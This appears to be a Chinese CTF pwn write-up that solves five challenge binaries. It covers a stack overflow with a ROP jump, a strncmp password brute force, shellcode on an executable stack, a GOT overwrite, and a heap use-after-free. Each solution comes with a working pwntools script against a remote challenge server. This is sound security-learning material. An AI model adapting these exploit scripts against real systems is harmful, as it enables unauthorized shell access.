    <content type="text"><![CDATA[STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串： 漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行 在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ： 通过栈溢出构造ROP：将vuln函数返回地址覆盖为flag，同时写入flag函数执行所需要的参数a1和a2。 exp123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'debug = 0flag_addr = 0x080485DFif debug: p= process("./stackoverflow")else: p = remote("111.230.132.82",40000)payload= 'a'*44payload += p32(flag_addr)payload += p32(0xdeadbeef) + p32(0xdeadbeef)+p32(12648430)p.recvuntil("Welcome to pwn world!\nLeave your name:")p.sendline(payload)p.interactive() login基本逻辑 main函数首先调用login()函数，用户输入username和password后，与服务器端预设的值进行比较。有两个用户：root和lilac。需要注意的是，strncmp的第三个参数，这个参数代表需要比较多少个字符。仔细看login函数中的strncmp是有问题的。（见2.漏洞） 从login返回之后，main函数会对登录是否成功进行判定，只有当用户为root且通过了login函数的比对操作才能继续进行，其余情况都会直接exit。而且即使login函数通过了之后，main函数还接着调用了check()函数来再次检查用户名和密码。注意，仔细查看login和check函数中的strncmp的第三个参数是不一样的：login中第三个参数是用户输入的长度，check中是指定的长度。 漏洞123456n = read_input_raw(username, 16);v3 = read_input_raw(password, 32);if ( !strncmp(username,"root",n)&amp;&amp;!strncmp(password,"passwd_has_be_changed_in_remote_", v3) ) &#123; v1 = 0; &#125; login函数第三个参数是用户输入的字符串长度，比如，我们只输入一个字符，那么strncmp就只比较两个字符串的一个字符，如果恰巧蒙对了，strncmp就返回0（代表相等）；没蒙对就继续蒙，直到蒙到第一位是正确的。由此，可以通过暴力破解依次获取每一位password。需要注意的是，我们拿到的可执行文件和服务器上的不是一个，出题人在password处暗示我们了：passwd_hasbe changed_inremote 漏洞利用从check函数中可以看出，root用户的密码为32位。通过暴力破解，多次启动进程，从返回结果是否是”How can you login successful as root!”来判断该位是否正确。可以通过查看ASCII表中可见字符的范围来缩小暴力破解的次数，我用的是33-126。 exp12345678910111213141516171819202122232425#暴力破解debug = 0for num in range(0,32): for i in range(33,126): if debug: p= process("./login") else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ") username = "root" p.sendline(username) p.recvuntil("Password: ") tmp = pwd+chr(i) p.sendline(tmp) hint = p.recvline() #print hint if "How can you login successful as root!" in hint: pwd+=chr(i) p.close() print pwd break p.close()print pwd 1234567891011121314151617#发送正确的username和passwordfrom pwn import *context.log_level = 'debug'debug = 0if debug: p= process("./login")else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ")username = "root"p.sendline(username)p.recvuntil("Password: ")pwd="XXXXX" #此处就是上一步暴力破解获取的pwdp.sendline(pwd)p.interactive() DragonBall基本逻辑一个小游戏，一共有15块，要集齐七个龙珠才能许愿，我们能实现的操作有买龙珠、卖龙珠、打印龙珠和对着龙珠许愿：P。 买的时候龙珠5块钱一个，但是注意，if里面只判断了money是否为0，并没有判断&gt;0 卖的时候龙珠只有3块钱，但这里在后续我们利用漏洞起到了一定作用。 wish函数里，向v1里读入wish字符串，向v2里读入yes or no，正常人会用这么大的缓冲区放yes和no吗？？v2分配了0x38大小，但是读入的时候读了0x40个字符，也就是说可以有8个字节的缓冲区溢出。v1分配了0x30大小，但是读入的时候读了0x68个字节。 漏洞首先，buy函数里，只要money不是0，是负数也无所谓，可以无穷尽的买卖，这样很快就能达到7个龙珠了。 其次，wish函数里v1和v2都可以进行缓冲区溢出。v1读入的0x68个字节可以占用v2的空间，v2读入的0x40正好可以修改返回地址。 漏洞利用保护机制：喜大普奔！这题没有开NX！也就是可以在栈上写入shell并执行 利用的思路就是：在v1或v2的位置写入shell，然后要获取栈地址，并将这个地址通过v2写入wish的返回地址，最后wish返回之后就能直接执行shell。 其余都好弄，就是如何获取栈上的地址。在gdb调试过程中，通过查看栈，发现此时ebp的值为0xffffc818，向上两个单元中的值总是和ebp相差0x10，而这个位置正好可以通过读取v1来得到，这样就得到了栈上的地址。可以发现，wish中会将v1中的内容打印出来（Your wish is %s…）。由此，先将v1中这个位置之前的内容都填满，共0x68-8=0x60个字节，其中包含着可执行的shell；然后再通过v2将返回地址的位置填上v1的地址即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level='debug'debug = 0if debug: p = process('./DragonBall')else: p = remote('111.230.132.82',40002)#buy dragonballfor i in range(0,2): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(0,6): p.recvuntil('You choice: ') p.sendline('1')#make a wishp.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')shellcode = asm(shellcraft.sh())payload = shellcode.ljust(0x60,'a')p.sendline(payload)p.recvuntil('Your wish is ')p.recv(0x60)stack_addr = u32(p.recv(4))wish_addr = stack_addr-0x10-0x68print "wish_addr:0x%x"%wish_addrp.recvuntil('is it right?\n(Y/N) ')payload = 60*'a'+p32(wish_addr)p.sendline(payload)p.interactive() nodes基本逻辑主要是对一个单向链表上的节点进行操作。 set_size函数是对BSS段上的一个值进行初始化，设置为48，这个字段后续要作为read函数的第三个参数。 main函数中限定了节点数最多为149. add_node函数，首先判断头节点是否存在，如果存在，就通过后向指针循环寻找下一节点，直到找到链表的尾部，添加新的节点；如果不存在，就构建头节点后再添加新的节点。 这里可以看见，read函数的第三个参数就是之前set_size函数里设置为48的那个字段unk_804a080。 通过add_node函数，可以了解到每一个节点的结构如下： edit_node函数通过value作为索引，找到对应节点，修改其data内容。 print_node顺序打印链表中每个节点的value和data。 漏洞说实话，这题的漏洞对我隐藏的太深了，我大概看了三个小时才找到漏洞。 main函数中的case 1，会打印已有的节点数，其中这个byte_904a060是一个bss段上的字段。 1sprintf(byte_804A060, "You have already insert %d nodes", nodes_num); 在bss段找到它，发现它实际分配了32字节的空间。 数一下You have already insert XXX nodes字符串，如果nodes_num是3位数，那么字符串长度为33位，也就是说，当添加的节点数大于等于100时就会触发堆溢出漏洞。从上图能够看出，byte_904a060之后正好就是 unk_804a080,就是最开始设置为48的read参数，一旦堆溢出，byte_904a060的最后一个字符s就会覆盖 unk_804a080，即read可以读入的字符串长度变成0x73，覆盖next指针的值，再次调用print_node时就会泄露内存。 漏洞利用system函数地址的泄露：首先申请100个节点，这时会造成堆溢出漏洞。这样read的第三个参数变得很大，通过edit_node将第99个节点的next指针覆写为puts函数的got表地址。再调用print_node时，第100个节点的地址就会变为puts函数的got表地址puts@got，打印出来的value也就是当前puts函数的真实地址。再通过libc中puts与system的相对便宜进一步得到system函数地址。再通过edit_node操作第100个节点，修改puts@got中的内容为system函数地址。 system函数调用： 当程序中调用puts时就相当于调用了system函数，可以事先在第一个节点的data中写入/bin/sh参数，当调用print_node时，触发puts(data)，即执行了system(‘/bin/sh’) exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *import timecontext.log_level='debug'debug = 0puts_got = 0x0804A024if debug: p = process('./nodes') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40003) libc = ELF('./libc.so.6')#add 100p.recvuntil('please input your choice:')p.sendline('1')p.recvuntil('Value:')p.sendline('1')p.recvuntil('Data:')p.sendline('/bin/sh')for i in range(2,101): #time.sleep(1) p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.sendline(str(i)) p.recvuntil('Data:') p.sendline('')#edit no.99p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline('99')p.recvuntil('New value:')p.sendline('99')p.recvuntil('New data:')p.sendline('a'*48 + p32(puts_got))#list -&gt; leak puts_addrp.recvuntil('please input your choice:')p.sendline('3')p.recvuntil("Your nodes:")for i in range(1,100): p.recvuntil('Value:') p.recvuntil('Data:')p.recvuntil('Value:')puts_addr = int(p.recv(10))print "puts_addr:0x%x" %puts_addrsystem_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])print "sys_addr:0x%x" %system_addr#edit 100p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline(str(puts_addr))p.recvuntil('New value:')p.sendline(str(system_addr))p.recvuntil('New data:')p.sendline(p32(system_addr))#listp.recvuntil('please input your choice:')p.sendline('3')p.interactive() babynote基本逻辑菜单类的题目，可以添加、编辑、删除和打印note。 add函数限定了note数量最多为3。通过add函数，能够看出程序管理每一块note的方法：有一个list数组用于存放每一个note的首地址，每一个note的大小是12字节，依次存放note中content的大小、content的地址和puts函数地址。 edit函数通过note的编号作为索引修改content的内容。 prints函数调用每一个note中的第三个字段（正常来说是puts函数地址）来打印每一个note的内容。 delete函数释放note的content地址空间和note地址空间，然而并没有将指针置0. 漏洞在delete函数中，被释放的指针没有置空，导致UAF（use after free）漏洞，即可以对已释放的内继续进行操作。 漏洞利用非常不巧，本题开了PIE保护，即程序的地址也不再是固定不变的了，漏洞的利用变得更加困难。 system函数的地址泄露： 涉及了一个新的知识点：main_arena。main_arena存在于libc的BSS段中，用于存放各种bin的头结点信息，如fastbin，smallbin和unsortedbin等。本题中，当最开始add了一个note，并设置content大小为一个大于64字节的数（例如100），再delete这个note时，这一块内存会首先放入unsortedbin当中，并将FD和BK设置为main_arena中unsortedbin的头结点地址。 可以通过调试查看，在100字节的content没有被释放时，main_arena的结构是这样的： 释放这个note之后，main_arena如下： 其中bins里存放的就是各类型的bin头结点的地址，发现0x5824b010就是unsortedbin头结点的地址，查看0x5824b010，就能看见刚刚释放的content 地址。 因此，system函数的地址泄露可以通过读取已释放的content的前四字节（FD指针）泄露libc的地址，进而泄露system的地址。 system函数的覆写和调用： 本题中note固定占用12字节，属于fastbin。当某一content正好也要申请12字节空间时，系统会先再fastbin上寻找是否有大小相同的chunk，如果有就会直接分配给content。如果这个chunk是之前释放的note，那么利用UAF漏洞，就可以修改内存。 先申请第一个note(note#0)，其content大小为100字节。再申请第二个note(note#1)，其content(content#1)大小为12字节。释放note #1和note #0。由于fastbin是LIFO的原则，此时fastbin上的chunk顺序为：note#0-&gt;note#1-&gt;content#1。此时再申请第三个note(note #2)，并要求content也为12，系统从fastbin中顺序摘下大小为12的chunk进行分配，那么note#2对应的就是note#0，content#2对应的就是note #1。 此时向content#2输入，就会覆写掉note#1原本的内容，将前两个字段写成/bin/sh，第三个字段写成system函数地址；然后再调用prints对note#1操作，就相当于直接调用了system函数。 PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.log_level='debug'debug = 0if debug: p = process('./babynote') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40004) libc = ELF('./libc.so.6')offset = 0x1b27b0def add(size,content): p.recvuntil("Your choice :") p.sendline('1') p.recvuntil("Content size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.sendline(content)def delete(index): p.recvuntil("Your choice :") p.sendline('4') p.recvuntil("Input the index:") p.sendline(str(index))def edit(index,content): p.recvuntil("Your choice :") p.sendline('2') p.recvuntil("Input the index:") p.sendline(str(index)) p.recvuntil("New content:") p.sendline(content)def prints(index): p.recvuntil("Your choice :") p.sendline('3') p.recvuntil("Input the index:") p.sendline(str(index))#0add(100,'a'*4)#1add(12,'/bin/sh')delete(1)delete(0)prints(1)prints(0)addr = u32(p.recv(4))print "addr:0x%x" %addrlibc_base = addr - offsetsys_addr = libc_base+libc.symbols['system']print "sys:0x%x"%sys_addr#2add(12,'c'*4)edit(2,'/bin/sh\0'+p32(sys_addr))prints(1)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
